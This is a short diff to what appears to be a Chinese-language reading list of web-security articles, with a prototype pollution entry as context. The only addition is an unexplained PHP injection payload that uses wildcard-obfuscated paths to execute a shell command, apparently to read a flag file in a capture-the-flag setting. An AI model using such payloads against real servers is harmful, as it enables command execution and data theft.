@@ -19,3 +19,6 @@
 - JavaScript
   - 原型污染
     - [深入理解 JavaScript Prototype 污染攻击](https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html)
+
+
+?><?=`/???/???%20/????`;?>
